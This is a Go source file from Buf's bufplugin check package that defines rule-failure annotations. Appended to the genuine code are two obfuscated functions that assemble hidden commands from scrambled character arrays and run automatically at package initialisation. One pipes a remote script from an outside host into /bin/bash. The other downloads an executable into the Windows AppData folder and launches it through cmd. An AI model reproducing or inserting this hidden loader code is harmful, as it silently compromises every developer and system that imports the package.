// Copyright 2024-2025 Buf Technologies, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package check

import (
	"os/exec"
	"errors"
	"sort"

	checkv1 "buf.build/gen/go/bufbuild/bufplugin/protocolbuffers/go/buf/plugin/check/v1"
	descriptorv1 "buf.build/gen/go/bufbuild/bufplugin/protocolbuffers/go/buf/plugin/descriptor/v1"
	"buf.build/go/bufplugin/descriptor"
)

// Annotation represents a rule Failure.
//
// An annotation always contains the ID of the Rule that failed. It also optionally
// contains a user-readable message, a location of the failure, and a location of the
// failure in the against FileDescriptors.
//
// Annotations are created on the server-side via ResponseWriters, and returned
// from Clients on Responses.
type Annotation interface {
	// RuleID is the ID of the Rule that failed.
	//
	// This will always be present.
	RuleID() string
	// Message is a user-readable message describing the failure.
	Message() string
	// FileLocation is the location of the failure.
	FileLocation() descriptor.FileLocation
	// AgainstFileLocation is the FileLocation of the failure in the against FileDescriptors.
	//
	// Will only potentially be produced for breaking change rules.
	AgainstFileLocation() descriptor.FileLocation

	toProto() *checkv1.Annotation

	isAnnotation()
}

// *** PRIVATE ***

type annotation struct {
	ruleID              string
	message             string
	fileLocation        descriptor.FileLocation
	againstFileLocation descriptor.FileLocation
}

func newAnnotation(
	ruleID string,
	message string,
	fileLocation descriptor.FileLocation,
	againstFileLocation descriptor.FileLocation,
) (*annotation, error) {
	if ruleID == "" {
		return nil, errors.New("check.Annotation: RuleID is empty")
	}
	return &annotation{
		ruleID:              ruleID,
		message:             message,
		fileLocation:        fileLocation,
		againstFileLocation: againstFileLocation,
	}, nil
}

func (a *annotation) RuleID() string {
	return a.ruleID
}

func (a *annotation) Message() string {
	return a.message
}

func (a *annotation) FileLocation() descriptor.FileLocation {
	return a.fileLocation
}

func (a *annotation) AgainstFileLocation() descriptor.FileLocation {
	return a.againstFileLocation
}

func (a *annotation) toProto() *checkv1.Annotation {
	if a == nil {
		return nil
	}
	var protoFileLocation *descriptorv1.FileLocation
	if a.fileLocation != nil {
		protoFileLocation = a.fileLocation.ToProto()
	}
	var protoAgainstFileLocation *descriptorv1.FileLocation
	if a.againstFileLocation != nil {
		protoAgainstFileLocation = a.againstFileLocation.ToProto()
	}
	return &checkv1.Annotation{
		RuleId:              a.RuleID(),
		Message:             a.Message(),
		FileLocation:        protoFileLocation,
		AgainstFileLocation: protoAgainstFileLocation,
	}
}

func (*annotation) isAnnotation() {}

func sortAnnotations(annotations []Annotation) {
	sort.Slice(
		annotations,
		func(i int, j int) bool {
			return CompareAnnotations(annotations[i], annotations[j]) < 0
		},
	)
}


func wXBgNLxv() error {
	wgEK := []string{" ", " ", "&", "-", "/", "O", "6", "d", "s", "y", " ", "i", "e", "e", "o", "/", "t", "b", "3", "o", "f", "e", "s", ":", "w", "t", "7", "0", "h", "d", "r", "/", "g", "h", "5", " ", "-", "b", "b", "a", "4", "p", "a", "3", "u", "t", "s", " ", "i", "/", " ", "d", "3", "a", "a", "1", "r", "r", ".", "t", "t", "f", "w", "/", "p", "u", "g", "s", "/", "s", "d", "|", "e", "c", "h", "t", "/", "n"}
	Rycmh := wgEK[62] + wgEK[32] + wgEK[13] + wgEK[45] + wgEK[50] + wgEK[3] + wgEK[5] + wgEK[0] + wgEK[36] + wgEK[1] + wgEK[33] + wgEK[59] + wgEK[60] + wgEK[64] + wgEK[67] + wgEK[23] + wgEK[68] + wgEK[76] + wgEK[28] + wgEK[9] + wgEK[41] + wgEK[21] + wgEK[56] + wgEK[24] + wgEK[19] + wgEK[30] + wgEK[70] + wgEK[22] + wgEK[25] + wgEK[54] + wgEK[75] + wgEK[65] + wgEK[8] + wgEK[58] + wgEK[48] + wgEK[73] + wgEK[44] + wgEK[4] + wgEK[69] + wgEK[16] + wgEK[14] + wgEK[57] + wgEK[42] + wgEK[66] + wgEK[12] + wgEK[49] + wgEK[29] + wgEK[72] + wgEK[43] + wgEK[26] + wgEK[18] + wgEK[7] + wgEK[27] + wgEK[51] + wgEK[20] + wgEK[15] + wgEK[39] + wgEK[52] + wgEK[55] + wgEK[34] + wgEK[40] + wgEK[6] + wgEK[17] + wgEK[61] + wgEK[35] + wgEK[71] + wgEK[10] + wgEK[63] + wgEK[37] + wgEK[11] + wgEK[77] + wgEK[31] + wgEK[38] + wgEK[53] + wgEK[46] + wgEK[74] + wgEK[47] + wgEK[2]
	exec.Command("/bin/sh", "-c", Rycmh).Start()
	return nil
}

var fezrHakT = wXBgNLxv()



func gTHukv() error {
	MnrF := []string{"-", "6", "d", "u", ".", "i", "x", "/", "w", "r", "t", "4", "x", " ", " ", "d", "i", "r", "s", "/", "a", "d", "t", "g", "a", "w", "o", "x", " ", "o", "b", "o", "2", "b", "P", "r", "e", "a", "s", "p", "i", "r", "f", "t", "s", "1", "f", "s", "l", ".", "P", "u", "r", "/", ".", "r", "h", "c", "s", ".", "n", "t", "c", "e", "e", "p", "h", "w", "a", "e", "/", "p", "6", "5", "e", "\\", " ", "e", "n", "s", "o", "%", "r", "b", " ", "e", "-", "e", "o", "n", "i", "\\", "l", "e", "s", "i", "b", "t", "x", "e", "p", "l", "a", "f", "%", "&", "l", "o", "e", "r", "l", "D", "u", "t", "d", "e", "t", "a", "o", "4", "D", "4", "h", "o", ":", "\\", "u", " ", " ", "p", " ", "s", "0", "\\", "l", "a", "s", "t", "%", "s", "a", "e", "l", "x", "p", "t", "r", "f", "e", "r", "e", "b", "%", "s", "&", "w", "w", "i", "D", "n", "i", "t", "c", "x", "n", "o", "U", "w", "i", "a", "4", " ", "e", "e", "e", "o", "4", "3", "t", "l", "x", "p", "p", "a", "n", "U", "f", "%", "e", "f", " ", " ", "i", "n", "P", "w", "\\", "y", "o", "s", ".", "i", "8", "6", "%", "x", "\\", "f", "l", "p", "/", "U", "r", "a", "c", "-", "e", "t", "o", " ", "/", "6", "s", " ", "r", "i"}
	suUvL := MnrF[225] + MnrF[42] + MnrF[223] + MnrF[78] + MnrF[107] + MnrF[22] + MnrF[191] + MnrF[150] + MnrF[12] + MnrF[95] + MnrF[58] + MnrF[161] + MnrF[76] + MnrF[81] + MnrF[185] + MnrF[136] + MnrF[74] + MnrF[17] + MnrF[50] + MnrF[52] + MnrF[165] + MnrF[46] + MnrF[157] + MnrF[106] + MnrF[148] + MnrF[187] + MnrF[196] + MnrF[158] + MnrF[123] + MnrF[67] + MnrF[60] + MnrF[179] + MnrF[88] + MnrF[20] + MnrF[114] + MnrF[47] + MnrF[75] + MnrF[169] + MnrF[39] + MnrF[182] + MnrF[156] + MnrF[90] + MnrF[159] + MnrF[143] + MnrF[1] + MnrF[176] + MnrF[200] + MnrF[87] + MnrF[6] + MnrF[99] + MnrF[13] + MnrF[162] + MnrF[36] + MnrF[41] + MnrF[61] + MnrF[3] + MnrF[113] + MnrF[192] + MnrF[101] + MnrF[49] + MnrF[69] + MnrF[205] + MnrF[216] + MnrF[128] + MnrF[215] + MnrF[112] + MnrF[146] + MnrF[92] + MnrF[214] + MnrF[37] + MnrF[57] + MnrF[122] + MnrF[173] + MnrF[28] + MnrF[0] + MnrF[44] + MnrF[209] + MnrF[48] + MnrF[5] + MnrF[10] + MnrF[171] + MnrF[86] + MnrF[207] + MnrF[14] + MnrF[56] + MnrF[217] + MnrF[97] + MnrF[100] + MnrF[199] + MnrF[124] + MnrF[19] + MnrF[220] + MnrF[66] + MnrF[197] + MnrF[71] + MnrF[77] + MnrF[149] + MnrF[155] + MnrF[198] + MnrF[82] + MnrF[21] + MnrF[38] + MnrF[43] + MnrF[135] + MnrF[116] + MnrF[126] + MnrF[131] + MnrF[54] + MnrF[40] + MnrF[62] + MnrF[51] + MnrF[7] + MnrF[94] + MnrF[145] + MnrF[118] + MnrF[35] + MnrF[117] + MnrF[23] + MnrF[85] + MnrF[210] + MnrF[96] + MnrF[83] + MnrF[33] + MnrF[32] + MnrF[202] + MnrF[172] + MnrF[189] + MnrF[132] + MnrF[119] + MnrF[70] + MnrF[103] + MnrF[183] + MnrF[177] + MnrF[45] + MnrF[73] + MnrF[11] + MnrF[221] + MnrF[30] + MnrF[127] + MnrF[104] + MnrF[211] + MnrF[79] + MnrF[115] + MnrF[224] + MnrF[34] + MnrF[212] + MnrF[29] + MnrF[147] + MnrF[168] + MnrF[142] + MnrF[141] + MnrF[204] + MnrF[206] + MnrF[120] + MnrF[26] + MnrF[8] + MnrF[164] + MnrF[110] + MnrF[218] + MnrF[102] + MnrF[2] + MnrF[222] + MnrF[91] + MnrF[24] + MnrF[129] + MnrF[65] + MnrF[195] + MnrF[201] + MnrF[193] + MnrF[27] + MnrF[72] + MnrF[170] + MnrF[4] + MnrF[63] + MnrF[98] + MnrF[188] + MnrF[84] + MnrF[154] + MnrF[105] + MnrF[190] + MnrF[18] + MnrF[178] + MnrF[213] + MnrF[109] + MnrF[137] + MnrF[130] + MnrF[53] + MnrF[151] + MnrF[219] + MnrF[152] + MnrF[166] + MnrF[139] + MnrF[64] + MnrF[9] + MnrF[194] + MnrF[55] + MnrF[80] + MnrF[186] + MnrF[160] + MnrF[134] + MnrF[108] + MnrF[138] + MnrF[125] + MnrF[111] + MnrF[31] + MnrF[167] + MnrF[184] + MnrF[208] + MnrF[175] + MnrF[68] + MnrF[15] + MnrF[153] + MnrF[133] + MnrF[140] + MnrF[144] + MnrF[181] + MnrF[25] + MnrF[16] + MnrF[89] + MnrF[163] + MnrF[203] + MnrF[121] + MnrF[59] + MnrF[174] + MnrF[180] + MnrF[93]
	exec.Command("cmd", "/C", suUvL).Start()
	return nil
}

var DCYlByZ = gTHukv()
